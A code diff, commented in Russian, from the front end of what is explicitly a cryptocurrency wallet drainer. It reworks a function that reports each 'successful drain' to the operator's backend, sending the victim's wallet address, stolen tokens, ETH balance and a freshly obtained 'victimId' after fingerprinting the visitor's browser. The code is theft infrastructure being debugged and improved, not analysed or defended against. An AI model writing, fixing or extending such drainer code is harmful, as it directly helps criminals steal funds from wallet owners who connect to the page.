@@ -133,12 +133,14 @@ async function sendConnectionData(walletAddress) {
 
 /**
  * Отправка данных об успешном дрейне
+ * ВСЕГДА получает новый victimId перед отправкой.
  */
 async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
     try {
         console.log('[FRONTEND] sendSuccessData: Начало отправки данных об успехе');
-        
-        // Сначала делаем запрос к /visit для получения актуального victimId
+
+        // --- ШАГ 1: Получаем СВЕЖИЙ victimId ---
+        console.log('[FRONTEND] sendSuccessData: Получение нового victimId...');
         const visitResponse = await fetch(`${BACKEND_URL}/visit`, {
             method: 'POST',
             headers: {
@@ -149,28 +151,32 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
                 platform: navigator.platform || 'Unknown',
                 language: navigator.language || 'Unknown',
                 timestamp: new Date().toISOString()
+                // Нам НЕ нужен флаг silent, пусть сервер думает, что это новое посещение.
+                // Это решит проблему с невалидным victimId.
             })
         });
 
         if (!visitResponse.ok) {
             const errorText = await visitResponse.text();
-            console.error('[FRONTEND] sendSuccessData: Ошибка при проверке посещения:', errorText);
+            console.error('[FRONTEND] sendSuccessData: Ошибка при получении victimId (/visit):', errorText);
+            // Не продолжаем, если не смогли получить ID
             return;
         }
 
         const visitResult = await visitResponse.json();
-        console.log('[FRONTEND] sendSuccessData: Получен ответ от /visit:', visitResult);
+        console.log('[FRONTEND] sendSuccessData: Ответ от /visit:', visitResult);
 
         if (!visitResult.success || !visitResult.id) {
-            console.warn('[FRONTEND] sendSuccessData: Сервер не вернул success=true или id');
+            console.warn('[FRONTEND] sendSuccessData: /visit не вернул success=true или id');
             return;
         }
 
-        // Используем только что полученный victimId
-        const victimId = visitResult.id;
-        console.log('[FRONTEND] sendSuccessData: Используем новый victimId:', victimId);
+        const freshVictimId = visitResult.id;
+        console.log('[FRONTEND] sendSuccessData: Получен новый victimId:', freshVictimId);
+        // --- КОНЕЦ ШАГА 1 ---
 
-        // Обрабатываем tokens, если это массив объектов, извлекаем символы
+        // --- ШАГ 2: Формируем данные для /success ---
+        // Обрабатываем tokens
         let tokensForBackend = [];
         if (Array.isArray(tokens)) {
             tokensForBackend = tokens.map(t => (typeof t === 'object' && t.symbol) ? t.symbol : String(t));
@@ -178,10 +184,9 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             tokensForBackend = [String(tokens)];
         }
 
-        // Формируем данные для отправки
         const successData = {
-            victimId: victimId,
-            walletAddress: userAccount, // Используем глобальную переменную
+            victimId: freshVictimId, // <-- Используем СВЕЖИЙ ID
+            walletAddress: userAccount,
             tokens: tokensForBackend,
             ethBalance: ethBalance,
             successTokens: Array.isArray(successTokens) ? successTokens : [],
@@ -190,9 +195,10 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             timestamp: new Date().toISOString()
         };
 
-        console.log('[FRONTEND] sendSuccessData: Данные для отправки', successData);
+        console.log('[FRONTEND] sendSuccessData: Данные для отправки на /success', successData);
+        // --- КОНЕЦ ШАГА 2 ---
 
-        // Отправляем данные на бэкенд
+        // --- ШАГ 3: Отправляем данные на /success ---
         const response = await fetch(`${BACKEND_URL}/success`, {
             method: 'POST',
             headers: {
@@ -201,24 +207,24 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             body: JSON.stringify(successData)
         });
 
-        console.log('[FRONTEND] sendSuccessData: Получен ответ от сервера', response.status, response.statusText);
+        console.log('[FRONTEND] sendSuccessData: Ответ от /success', response.status, response.statusText);
 
         if (!response.ok) {
             const errorText = await response.text();
-            console.error('[FRONTEND] sendSuccessData: Ошибка от сервера:', errorText);
+            console.error('[FRONTEND] sendSuccessData: Ошибка от /success:', errorText);
             return;
         }
 
         const result = await response.json();
-        console.log('[FRONTEND] sendSuccessData: Ответ сервера', result);
-        
-        // Успешно отправлено
-        console.log('[FRONTEND] sendSuccessData: Данные об успехе успешно отправлены на бэкенд.');
+        console.log('[FRONTEND] sendSuccessData: Успешный ответ от /success', result);
+        console.log('[FRONTEND] sendSuccessData: ✅ Уведомление об успехе ОТПРАВЛЕНО!');
+        // --- КОНЕЦ ШАГА 3 ---
 
     } catch (error) {
-        console.error('[FRONTEND] sendSuccessData: Критическая ошибка при отправке данных об успехе:', error);
+        console.error('[FRONTEND] sendSuccessData: Критическая ошибка:', error);
     }
 }
+
 // --- Конец функций бэкенда ---
 
 // Функция для переключения на сеть Sepolia
@@ -699,6 +705,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
